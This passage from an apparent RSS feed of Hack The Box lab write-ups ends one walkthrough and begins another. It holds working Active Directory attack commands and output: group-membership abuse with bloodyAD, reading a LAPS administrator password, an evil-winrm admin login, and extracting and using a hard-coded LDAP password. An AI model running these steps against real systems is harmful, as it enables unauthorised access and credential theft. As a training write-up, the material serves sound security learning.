<p><img src="https://exploit.se/posts/2022-08-03-htb-writeup-streamio/images/streamio04.png" class="img-fluid"></p>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> streamio.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> jdgodd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.10.11.158 addObjectToGroup JDGODD <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CORE STAFF"</span></span>
<span id="cb26-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> JDGODD found at CN=JDgodd,CN=Users,DC=streamIO,DC=htb</span>
<span id="cb26-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> CORE STAFF found at CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb</span>
<span id="cb26-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> CN=JDgodd,CN=Users,DC=streamIO,DC=htb added to CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb</span>
<span id="cb26-5"></span>
<span id="cb26-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> streamio.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> jdgodd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.10.11.158 getObjectAttributes  <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CORE STAFF"</span> member</span>
<span id="cb26-7"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb26-8">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"member"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> [</span>
<span id="cb26-9">        <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CN=JDgodd,CN=Users,DC=streamIO,DC=htb"</span></span>
<span id="cb26-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span></span>
<span id="cb26-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb26-12"></span>
<span id="cb26-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Read LAPS Password</span></span>
<span id="cb26-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> streamio <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> jdgodd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.10.11.158 getObjectAttributes dc$ ms-mcs-admpwd </span>
<span id="cb26-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb26-16">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ms-Mcs-AdmPwd"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"#J</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$FRGC</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-6446b3"</span></span>
<span id="cb26-17"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span></code></pre></div>
<p>Login as Administrator and grab root.txt.</p>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio evil-winrm <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> 10.10.11.158 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> Administrator <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'#J$FRGC-6446b3'</span></span>
<span id="cb27-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*Evil-WinRM*</span> PS C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\M</span>artin<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>esktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> cat root.txt</span>
<span id="cb27-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8e096689d3272326aa70edf422e01127</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="referenses" class="level1">
<h1>Referenses</h1>
<p>MsSQL SELECT: https://docs.microsoft.com/en-us/sql/t-sql/queries/select-examples-transact-sql?view=sql-server-ver16</p>
<p>MsSQL Concat: https://www.sqlservertutorial.net/sql-server-string-functions/sql-server-concat_ws-function/#:~:text=The%20SQL%20Server%20CONCAT_WS()%20function%20concatenates%20two%20or%20more,()%20means%20concatenate%20with%20separator.&amp;text=In%20this%20syntax%3A,NCHAR%20%2C%20VARCHAR%20%2C%20or%20NVARCHAR%20.</p>


</section>

 ]]></description>
  <category>hackthebox</category>
  <category>windows</category>
  <category>fuzzing</category>
  <category>sqli</category>
  <category>php</category>
  <category>bloodhound</category>
  <category>bloodyad</category>
  <category>firefox</category>
  <guid>https://exploit.se/posts/2022-08-03-htb-writeup-streamio/2022-08-03-htb-writeup-streamio.html</guid>
  <pubDate>Wed, 03 Aug 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-08-03-htb-writeup-streamio/images/streamio_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Support - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-08-02-htb-writeup-support/2022-08-02-htb-writeup-support.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.129.146.169</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc</span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  ldapssl</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  wsman</span>
<span id="cb1-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  adws</span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49664/tcp</span> open  unknown</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  unknown</span>
<span id="cb1-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49670/tcp</span> open  unknown</span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49682/tcp</span> open  unknown</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49699/tcp</span> open  unknown</span>
<span id="cb1-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">61531/tcp</span> open  unknown</span>
<span id="cb1-22"></span>
<span id="cb1-23"></span>
<span id="cb1-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49670,49682,49699,61531</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.129.146.169</span>
<span id="cb1-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE       VERSION</span>
<span id="cb1-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain        Simple DNS Plus</span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec  Microsoft Windows Kerberos <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server</span> time: 2022-08-01 08:44:20Z<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> support.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  tcpwrapped</span>
<span id="cb1-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> support.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  tcpwrapped</span>
<span id="cb1-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5985/tcp</span>  open  http          Microsoft HTTPAPI httpd 2.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SSDP/UPnP</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Not Found</span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  mc-nmf        .NET Message Framing</span>
<span id="cb1-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49664/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49670/tcp</span> open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49682/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49699/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">61531/tcp</span> open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: Host: DC<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">OS:</span> Windows<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:microsoft:windows</span>
<span id="cb1-48"></span>
<span id="cb1-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> script results:</span>
<span id="cb1-50"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_clock-skew:</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-1s</span></span>
<span id="cb1-51"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb2-time:</span> </span>
<span id="cb1-52"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">date:</span> 2022-08-01T08:45:09</span>
<span id="cb1-53"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  start_date: N/A</span>
<span id="cb1-54"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb2-security-mode:</span> </span>
<span id="cb1-55"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3.1.1:</span> </span>
<span id="cb1-56"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    Message signing enabled and required</span>
<span id="cb1-57"></span>
<span id="cb1-58"></span>
<span id="cb1-59"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> 10.129.146.169 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-ports</span> 100 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span></span>
<span id="cb1-60"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE</span>
<span id="cb1-61"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">123/udp</span> open  ntp</span></code></pre></div>
<p><strong>smbclient:</strong></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support smbclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 10.129.146.169</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password</span> for <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">WORKGROUP</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">oid</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:</span>
<span id="cb2-3"></span>
<span id="cb2-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sharename</span>       Type      Comment</span>
<span id="cb2-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">---------</span>       <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">----</span>      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-------</span></span>
<span id="cb2-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ADMIN$</span>          Disk      Remote Admin</span>
<span id="cb2-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">C$</span>              Disk      Default share</span>
<span id="cb2-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">IPC$</span>            IPC       Remote IPC</span>
<span id="cb2-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">NETLOGON</span>        Disk      Logon server share </span>
<span id="cb2-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">support-tools</span>   Disk      support staff tools</span>
<span id="cb2-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SYSVOL</span>          Disk      Logon server share </span>
<span id="cb2-12">    </span>
<span id="cb2-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support smbclient <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\\\</span>10.129.146.169<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\</span>support-tools</span>
<span id="cb2-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password</span> for <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">WORKGROUP</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">oid</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:</span>
<span id="cb2-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">smb:</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\&gt;</span> ls</span>
<span id="cb2-16">  <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span>                                   D        0  Wed Jul 20 19:01:06 2022</span>
<span id="cb2-17">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">..</span>                                  D        0  Sat May 28 13:18:25 2022</span>
<span id="cb2-18">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7-ZipPortable_21.07.paf.exe</span>         A  2880728  Sat May 28 13:19:19 2022</span>
<span id="cb2-19">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">npp.8.4.1.portable.x64.zip</span>          A  5439245  Sat May 28 13:19:55 2022</span>
<span id="cb2-20">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">putty.exe</span>                           A  1273576  Sat May 28 13:20:06 2022</span>
<span id="cb2-21">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SysinternalsSuite.zip</span>               A 48102161  Sat May 28 13:19:31 2022</span>
<span id="cb2-22">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UserInfo.exe.zip</span>                    A   277499  Wed Jul 20 19:01:07 2022</span>
<span id="cb2-23">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">windirstat1_1_2_setup.exe</span>           A    79171  Sat May 28 13:20:17 2022</span>
<span id="cb2-24">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">WiresharkPortable64_3.6.5.paf.exe</span>      A 44398000  Sat May 28 13:19:43 2022</span>
<span id="cb2-25"></span>
<span id="cb2-26">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4026367</span> blocks of size 4096. 883481 blocks available    </span></code></pre></div>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p><strong>UserInfo</strong> has a unique date compared to the other files, and is also one that I don’t recognize directly. Download the file and analyze the contents.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support unzip UserInfo.exe.zip <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> UserInfo</span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Archive:</span>  UserInfo.exe.zip</span>
<span id="cb3-3">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/UserInfo.exe   </span>
<span id="cb3-4">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/CommandLineParser.dll  </span>
<span id="cb3-5">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/Microsoft.Bcl.AsyncInterfaces.dll  </span>
<span id="cb3-6">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/Microsoft.Extensions.DependencyInjection.Abstractions.dll  </span>
<span id="cb3-7">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/Microsoft.Extensions.DependencyInjection.dll  </span>
<span id="cb3-8">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/Microsoft.Extensions.Logging.Abstractions.dll  </span>
<span id="cb3-9">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/System.Buffers.dll  </span>
<span id="cb3-10">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/System.Memory.dll  </span>
<span id="cb3-11">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/System.Numerics.Vectors.dll  </span>
<span id="cb3-12">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/System.Runtime.CompilerServices.Unsafe.dll  </span>
<span id="cb3-13">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/System.Threading.Tasks.Extensions.dll  </span>
<span id="cb3-14">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">inflating:</span> UserInfo/UserInfo.exe.config</span></code></pre></div>
<p>Open the .exe binary in dnSpy, go through the code and we find ..</p>
<p>.. the user which is used to do the ldap queries, <code>support\ldap</code>. (UserInfo.Services.LdapQuery) <img src="https://exploit.se/posts/2022-08-02-htb-writeup-support/images/support01.png" class="img-fluid"></p>
<p>.. the encrypted password (<code>0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E</code>) for <code>support\ldap</code> and the function used to decrypt it. (UserInfo.Services.Protected) <img src="https://exploit.se/posts/2022-08-02-htb-writeup-support/images/support02.png" class="img-fluid"></p>
<p>We can simply extract the password by setting a breakpoint on the return function and look at the values of <code>array</code>. Within we find 36 hex values, throw them into <a href="https://gchq.github.io/CyberChef/">cyberchef</a>and we get:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hex:</span> 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ascii:</span> nvEfEK16^1aM4<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$e7AclUf8x$tRWxPWO1</span>%lmz</span></code></pre></div>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>We can now do ldap queries and find all users:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support ldapsearch <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-x</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> ldap://10.129.146.169 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-D</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'support\ldap'</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-b</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"DC=support,DC=htb"</span></span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb5-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># support, Users, support.htb</span></span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dn:</span> CN=support,CN=Users,DC=support,DC=htb</span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">objectClass:</span> top</span>
<span id="cb5-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">objectClass:</span> person</span>
<span id="cb5-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">objectClass:</span> organizationalPerson</span>
<span id="cb5-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">objectClass:</span> user</span>
<span id="cb5-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cn:</span> support</span>
<span id="cb5-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c:</span> US</span>
<span id="cb5-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">l:</span> Chapel Hill</span>
<span id="cb5-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">st:</span> NC</span>
<span id="cb5-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">postalCode:</span> 27514</span>
<span id="cb5-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">distinguishedName:</span> CN=support,CN=Users,DC=support,DC=htb</span>
<span id="cb5-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">instanceType:</span> 4</span>
<span id="cb5-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">whenCreated:</span> 20220528111200.0Z</span>
<span id="cb5-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">whenChanged:</span> 20220528111201.0Z</span>
